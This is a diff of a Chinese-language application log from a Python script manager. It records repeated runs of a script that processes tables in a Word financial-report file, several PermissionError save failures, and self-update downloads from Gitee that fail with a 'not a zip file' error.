+[2026-04-28 21:49:31] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 21:49:31] 处理完成：成功 1 / 总计 1
+[2026-04-28 21:50:28] 开始批量处理：共 1 个文件
+[2026-04-28 21:50:28] 输出目录：output
+[2026-04-28 21:50:28] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:50:30] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 21:50:30] 处理完成：成功 1 / 总计 1
+[2026-04-28 21:51:43] 开始批量处理：共 1 个文件
+[2026-04-28 21:51:43] 输出目录：output
+[2026-04-28 21:51:43] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:51:45] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 21:51:45] 处理完成：成功 1 / 总计 1
+[2026-04-28 21:52:44] 开始批量处理：共 1 个文件
+[2026-04-28 21:52:44] 输出目录：output
+[2026-04-28 21:52:44] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:52:45] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 21:52:45] 处理完成：成功 1 / 总计 1
+[2026-04-28 21:54:59] 开始批量处理：共 1 个文件
+[2026-04-28 21:54:59] 输出目录：output
+[2026-04-28 21:54:59] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:55:01] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 21:55:01] 处理完成：成功 1 / 总计 1
+[2026-04-28 21:56:13] 开始批量处理：共 1 个文件
+[2026-04-28 21:56:13] 输出目录：output
+[2026-04-28 21:56:13] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:56:15] ✗ 失败: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:56:15] 错误: [Errno 13] Permission denied: 'output\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+[2026-04-28 21:56:15] 详细: Traceback (most recent call last):
+  File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\报告word表格处理.py", line 246, in process_word_tables
+    doc.save(dst_path)
+    ~~~~~~~~^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\document.py", line 204, in save
+    self._part.save(path_or_stream)
+    ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\parts\document.py", line 114, in save
+    self.package.save(path_or_stream)
+    ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\package.py", line 166, in save
+    PackageWriter.write(pkg_file, self.rels, self.parts)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\pkgwriter.py", line 34, in write
+    phys_writer = PhysPkgWriter(pkg_file)
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\phys_pkg.py", line 109, in __init__
+    self._zipf = ZipFile(pkg_file, "w", compression=ZIP_DEFLATED)
+                 ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\zipfile\__init__.py", line 1453, in __init__
+    self.fp = io.open(file, filemode)
+              ~~~~~~~^^^^^^^^^^^^^^^^
+PermissionError: [Errno 13] Permission denied: 'output\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+
+[2026-04-28 21:56:15] 处理完成：成功 0 / 总计 1
+[2026-04-28 21:57:01] 开始批量处理：共 1 个文件
+[2026-04-28 21:57:01] 输出目录：output
+[2026-04-28 21:57:01] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:57:03] ✗ 失败: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:57:03] 错误: [Errno 13] Permission denied: 'output\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+[2026-04-28 21:57:03] 详细: Traceback (most recent call last):
+  File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\报告word表格处理.py", line 237, in process_word_tables
+    doc.save(dst_path)
+    ~~~~~~~~^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\document.py", line 204, in save
+    self._part.save(path_or_stream)
+    ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\parts\document.py", line 114, in save
+    self.package.save(path_or_stream)
+    ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\package.py", line 166, in save
+    PackageWriter.write(pkg_file, self.rels, self.parts)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\pkgwriter.py", line 34, in write
+    phys_writer = PhysPkgWriter(pkg_file)
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\phys_pkg.py", line 109, in __init__
+    self._zipf = ZipFile(pkg_file, "w", compression=ZIP_DEFLATED)
+                 ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\zipfile\__init__.py", line 1453, in __init__
+    self.fp = io.open(file, filemode)
+              ~~~~~~~^^^^^^^^^^^^^^^^
+PermissionError: [Errno 13] Permission denied: 'output\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+
+[2026-04-28 21:57:03] 处理完成：成功 0 / 总计 1
+[2026-04-28 21:58:02] 开始批量处理：共 1 个文件
+[2026-04-28 21:58:02] 输出目录：output
+[2026-04-28 21:58:02] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:58:04] ✗ 失败: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:58:04] 错误: [Errno 13] Permission denied: 'output\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+[2026-04-28 21:58:04] 详细: Traceback (most recent call last):
+  File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\报告word表格处理.py", line 237, in process_word_tables
+    doc.save(dst_path)
+    ~~~~~~~~^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\document.py", line 204, in save
+    self._part.save(path_or_stream)
+    ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\parts\document.py", line 114, in save
+    self.package.save(path_or_stream)
+    ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\package.py", line 166, in save
+    PackageWriter.write(pkg_file, self.rels, self.parts)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\pkgwriter.py", line 34, in write
+    phys_writer = PhysPkgWriter(pkg_file)
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\phys_pkg.py", line 109, in __init__
+    self._zipf = ZipFile(pkg_file, "w", compression=ZIP_DEFLATED)
+                 ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\zipfile\__init__.py", line 1453, in __init__
+    self.fp = io.open(file, filemode)
+              ~~~~~~~^^^^^^^^^^^^^^^^
+PermissionError: [Errno 13] Permission denied: 'output\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+
+[2026-04-28 21:58:04] 处理完成：成功 0 / 总计 1
+[2026-04-28 21:59:09] 开始批量处理：共 1 个文件
+[2026-04-28 21:59:09] 输出目录：output
+[2026-04-28 21:59:09] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:59:11] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 21:59:11] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:01:10] 开始批量处理：共 1 个文件
+[2026-04-28 22:01:10] 输出目录：output
+[2026-04-28 22:01:10] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:01:12] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:01:12] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:02:34] 开始批量处理：共 1 个文件
+[2026-04-28 22:02:34] 输出目录：output
+[2026-04-28 22:02:34] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:02:36] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:02:36] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:05:05] ─── 框架依赖检查 ───
+[2026-04-28 22:05:05] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 22:05:05] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 22:05:07] [Gitee] 最新版本: 1.8.8, 下载链接: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:05:07] 当前已是最新版本 v1.8.8
+[2026-04-28 22:05:09] 开始下载更新到：C:\Users\ahdsz\AppData\Local\Temp\tmp_n4lntxx\1.8.8.zip
+[2026-04-28 22:05:09] 开始下载文件，URL: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:05:09] 目标路径: C:\Users\ahdsz\AppData\Local\Temp\tmp_n4lntxx\1.8.8.zip
+[2026-04-28 22:05:10] 下载中... (8192 bytes)
+[2026-04-28 22:05:10] 下载中... (16384 bytes)
+[2026-04-28 22:05:10] 下载中... (24576 bytes)
+[2026-04-28 22:05:10] 下载中... (32768 bytes)
+[2026-04-28 22:05:10] 下载中... (40960 bytes)
+[2026-04-28 22:05:10] 下载中... (47933 bytes)
+[2026-04-28 22:05:10] 下载完成: C:\Users\ahdsz\AppData\Local\Temp\tmp_n4lntxx\1.8.8.zip
+[2026-04-28 22:05:10] 下载完成，开始应用更新
+[2026-04-28 22:05:10] 开始应用更新，当前文件：c:\Users\ahdsz\Documents\GitHub\pymanager\main.pyw
+[2026-04-28 22:05:10] 项目目录：c:\Users\ahdsz\Documents\GitHub\pymanager
+[2026-04-28 22:05:10] 下载路径：C:\Users\ahdsz\AppData\Local\Temp\tmp_n4lntxx\1.8.8.zip
+[2026-04-28 22:05:10] 创建备份：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_03.zip
+[2026-04-28 22:05:10] 备份创建成功：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_03.zip
+[2026-04-28 22:05:10] 备份已创建：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_03.zip
+[2026-04-28 22:05:10] 解压到临时目录：C:\Users\ahdsz\AppData\Local\Temp\tmpa5xen5qk
+[2026-04-28 22:05:10] [错误] 应用更新过程中发生错误：File is not a zip file
+[2026-04-28 22:06:03] 开始批量处理：共 1 个文件
+[2026-04-28 22:06:03] 输出目录：output
+[2026-04-28 22:06:03] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:06:05] ✗ 失败: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:06:05] 错误: [Errno 13] Permission denied: 'output\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+[2026-04-28 22:06:05] 详细: Traceback (most recent call last):
+  File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\报告word表格处理.py", line 181, in process_word_tables
+    doc.save(dst_path)
+    ~~~~~~~~^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\document.py", line 204, in save
+    self._part.save(path_or_stream)
+    ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\parts\document.py", line 114, in save
+    self.package.save(path_or_stream)
+    ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\package.py", line 166, in save
+    PackageWriter.write(pkg_file, self.rels, self.parts)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\pkgwriter.py", line 34, in write
+    phys_writer = PhysPkgWriter(pkg_file)
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\phys_pkg.py", line 109, in __init__
+    self._zipf = ZipFile(pkg_file, "w", compression=ZIP_DEFLATED)
+                 ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\zipfile\__init__.py", line 1453, in __init__
+    self.fp = io.open(file, filemode)
+              ~~~~~~~^^^^^^^^^^^^^^^^
+PermissionError: [Errno 13] Permission denied: 'output\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+
+[2026-04-28 22:06:05] 处理完成：成功 0 / 总计 1
+[2026-04-28 22:06:29] 📄 报告word表格处理.py
+[2026-04-28 22:06:29] （该脚本无头注释）
+[2026-04-28 22:06:29] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 22:06:29] 扫描到的所有导入：docx, modules, os, re, sys, threading, tkinter, traceback
+[2026-04-28 22:06:29] 第三方依赖：docx, modules
+[2026-04-28 22:06:29] 
+[2026-04-28 22:06:29]   docx: 已安装
+[2026-04-28 22:06:29]   modules: 已安装
+[2026-04-28 22:06:29] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 22:06:29] 所有依赖已满足
+[2026-04-28 22:06:29] 
+[2026-04-28 22:06:29] 开始运行：报告word表格处理.py
+[2026-04-28 22:06:29] 运行路径：报告word表格处理.py
+[2026-04-28 22:06:29] 
+[2026-04-28 22:06:38] 开始批量处理：共 1 个文件
+[2026-04-28 22:06:38] 输出目录：C:/Users/ahdsz/Desktop
+[2026-04-28 22:06:38] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:06:40] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:06:40] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:06:40] 运行完成：报告word表格处理.py，退出码：0
+[2026-04-28 22:08:31] [Gitee] 最新版本: 1.8.8, 下载链接: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:08:31] 当前已是最新版本 v1.8.8
+[2026-04-28 22:08:34] 开始下载更新到：C:\Users\ahdsz\AppData\Local\Temp\tmpcl5wyit2\1.8.8.zip
+[2026-04-28 22:08:34] 开始下载文件，URL: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:08:34] 目标路径: C:\Users\ahdsz\AppData\Local\Temp\tmpcl5wyit2\1.8.8.zip
+[2026-04-28 22:08:35] 下载中... (8192 bytes)
+[2026-04-28 22:08:35] 下载中... (16384 bytes)
+[2026-04-28 22:08:35] 下载中... (24576 bytes)
+[2026-04-28 22:08:35] 下载中... (32768 bytes)
+[2026-04-28 22:08:35] 下载中... (40960 bytes)
+[2026-04-28 22:08:35] 下载中... (47933 bytes)
+[2026-04-28 22:08:35] 下载完成: C:\Users\ahdsz\AppData\Local\Temp\tmpcl5wyit2\1.8.8.zip
+[2026-04-28 22:08:35] 下载完成，开始应用更新
+[2026-04-28 22:08:35] 开始应用更新，当前文件：c:\Users\ahdsz\Documents\GitHub\pymanager\main.pyw
+[2026-04-28 22:08:35] 项目目录：c:\Users\ahdsz\Documents\GitHub\pymanager
+[2026-04-28 22:08:35] 下载路径：C:\Users\ahdsz\AppData\Local\Temp\tmpcl5wyit2\1.8.8.zip
+[2026-04-28 22:08:35] 创建备份：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_04.zip
+[2026-04-28 22:08:35] 备份创建成功：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_04.zip
+[2026-04-28 22:08:35] 备份已创建：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_04.zip
+[2026-04-28 22:08:35] 解压到临时目录：C:\Users\ahdsz\AppData\Local\Temp\tmp223tpui8
+[2026-04-28 22:08:35] [错误] 应用更新过程中发生错误：File is not a zip file
+[2026-04-28 22:08:43] ─── 框架依赖检查 ───
+[2026-04-28 22:08:43] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 22:08:43] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 22:08:45] [Gitee] 最新版本: 1.8.8, 下载链接: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:08:45] 当前已是最新版本 v1.8.8
+[2026-04-28 22:08:48] 开始下载更新到：C:\Users\ahdsz\AppData\Local\Temp\tmp_cs2w_uy\1.8.8.zip
+[2026-04-28 22:08:48] 开始下载文件，URL: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 22:08:48] 目标路径: C:\Users\ahdsz\AppData\Local\Temp\tmp_cs2w_uy\1.8.8.zip
+[2026-04-28 22:08:48] 下载中... (8192 bytes)
+[2026-04-28 22:08:48] 下载中... (16384 bytes)
+[2026-04-28 22:08:48] 下载中... (24576 bytes)
+[2026-04-28 22:08:48] 开始批量处理：共 1 个文件
+[2026-04-28 22:08:48] 输出目录：output
+[2026-04-28 22:08:48] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:08:48] 下载中... (32768 bytes)
+[2026-04-28 22:08:48] 下载中... (40960 bytes)
+[2026-04-28 22:08:48] 下载中... (47933 bytes)
+[2026-04-28 22:08:48] 下载完成: C:\Users\ahdsz\AppData\Local\Temp\tmp_cs2w_uy\1.8.8.zip
+[2026-04-28 22:08:48] 下载完成，开始应用更新
+[2026-04-28 22:08:48] 开始应用更新，当前文件：c:\Users\ahdsz\Documents\GitHub\pymanager\main.pyw
+[2026-04-28 22:08:48] 项目目录：c:\Users\ahdsz\Documents\GitHub\pymanager
+[2026-04-28 22:08:48] 下载路径：C:\Users\ahdsz\AppData\Local\Temp\tmp_cs2w_uy\1.8.8.zip
+[2026-04-28 22:08:48] 创建备份：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_05.zip
+[2026-04-28 22:08:48] 备份创建成功：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_05.zip
+[2026-04-28 22:08:48] 备份已创建：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_05.zip
+[2026-04-28 22:08:48] 解压到临时目录：C:\Users\ahdsz\AppData\Local\Temp\tmpvd8cslvx
+[2026-04-28 22:08:49] [错误] 应用更新过程中发生错误：File is not a zip file
+[2026-04-28 22:08:50] ✗ 失败: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:08:50] 错误: [Errno 13] Permission denied: 'output\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+[2026-04-28 22:08:50] 详细: Traceback (most recent call last):
+  File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\报告word表格处理.py", line 220, in process_word_tables
+    doc.save(dst_path)
+    ~~~~~~~~^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\document.py", line 204, in save
+    self._part.save(path_or_stream)
+    ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\parts\document.py", line 114, in save
+    self.package.save(path_or_stream)
+    ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\package.py", line 166, in save
+    PackageWriter.write(pkg_file, self.rels, self.parts)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\pkgwriter.py", line 34, in write
+    phys_writer = PhysPkgWriter(pkg_file)
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\phys_pkg.py", line 109, in __init__
+    self._zipf = ZipFile(pkg_file, "w", compression=ZIP_DEFLATED)
+                 ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\zipfile\__init__.py", line 1453, in __init__
+    self.fp = io.open(file, filemode)
+              ~~~~~~~^^^^^^^^^^^^^^^^
+PermissionError: [Errno 13] Permission denied: 'output\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+
+[2026-04-28 22:08:50] 处理完成：成功 0 / 总计 1
+[2026-04-28 22:10:40] 开始批量处理：共 1 个文件
+[2026-04-28 22:10:40] 输出目录：output
+[2026-04-28 22:10:40] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:10:42] ✗ 失败: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:10:42] 错误: [Errno 13] Permission denied: 'output\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+[2026-04-28 22:10:42] 详细: Traceback (most recent call last):
+  File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\报告word表格处理.py", line 226, in process_word_tables
+    doc.save(dst_path)
+    ~~~~~~~~^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\document.py", line 204, in save
+    self._part.save(path_or_stream)
+    ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\parts\document.py", line 114, in save
+    self.package.save(path_or_stream)
+    ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\package.py", line 166, in save
+    PackageWriter.write(pkg_file, self.rels, self.parts)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\pkgwriter.py", line 34, in write
+    phys_writer = PhysPkgWriter(pkg_file)
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\phys_pkg.py", line 109, in __init__
+    self._zipf = ZipFile(pkg_file, "w", compression=ZIP_DEFLATED)
+                 ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\zipfile\__init__.py", line 1453, in __init__
+    self.fp = io.open(file, filemode)
+              ~~~~~~~^^^^^^^^^^^^^^^^
+PermissionError: [Errno 13] Permission denied: 'output\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+
+[2026-04-28 22:10:42] 处理完成：成功 0 / 总计 1
+[2026-04-28 22:11:27] ─── 框架依赖检查 ───
+[2026-04-28 22:11:27] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 22:11:28] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 22:11:30] 📄 报告word表格处理.py
+[2026-04-28 22:11:30] （该脚本无头注释）
+[2026-04-28 22:11:30] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 22:11:30] 扫描到的所有导入：docx, modules, os, re, sys, threading, tkinter, traceback
+[2026-04-28 22:11:30] 第三方依赖：docx, modules
+[2026-04-28 22:11:30] 
+[2026-04-28 22:11:30]   docx: 已安装
+[2026-04-28 22:11:30]   modules: 已安装
+[2026-04-28 22:11:30] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 22:11:30] 所有依赖已满足
+[2026-04-28 22:11:30] 
+[2026-04-28 22:11:30] 开始运行：报告word表格处理.py
+[2026-04-28 22:11:30] 运行路径：报告word表格处理.py
+[2026-04-28 22:11:30] 
+[2026-04-28 22:11:54] 开始批量处理：共 1 个文件
+[2026-04-28 22:11:54] 输出目录：C:/Users/ahdsz/Desktop
+[2026-04-28 22:11:54] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:11:56] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:11:56] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:11:56] 运行完成：报告word表格处理.py，退出码：0
+[2026-04-28 22:14:16] 开始批量处理：共 1 个文件
+[2026-04-28 22:14:16] 输出目录：output
+[2026-04-28 22:14:16] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:14:18] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 22:14:18] 处理完成：成功 1 / 总计 1
+[2026-04-28 22:15:59] 开始批量处理：共 1 个文件
+[2026-04-28 22:15:59] 输出目录：output
+[2026-04-28 22:15:59] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:16:01] ✗ 失败: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 22:16:01] 错误: [Errno 13] Permission denied: 'output\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+[2026-04-28 22:16:01] 详细: Traceback (most recent call last):
+  File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\报告word表格处理.py", line 263, in process_word_tables
+    doc.save(dst_path)
+    ~~~~~~~~^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\document.py", line 204, in save
+    self._part.save(path_or_stream)
+    ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\parts\document.py", line 114, in save
+    self.package.save(path_or_stream)
+    ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\package.py", line 166, in save
+    PackageWriter.write(pkg_file, self.rels, self.parts)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\pkgwriter.py", line 34, in write
+    phys_writer = PhysPkgWriter(pkg_file)
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\phys_pkg.py", line 109, in __init__
+    self._zipf = ZipFile(pkg_file, "w", compression=ZIP_DEFLATED)
+                 ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\zipfile\__init__.py", line 1453, in __init__
+    self.fp = io.open(file, filemode)
+              ~~~~~~~^^^^^^^^^^^^^^^^
+PermissionError: [Errno 13] Permission denied: 'output\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+
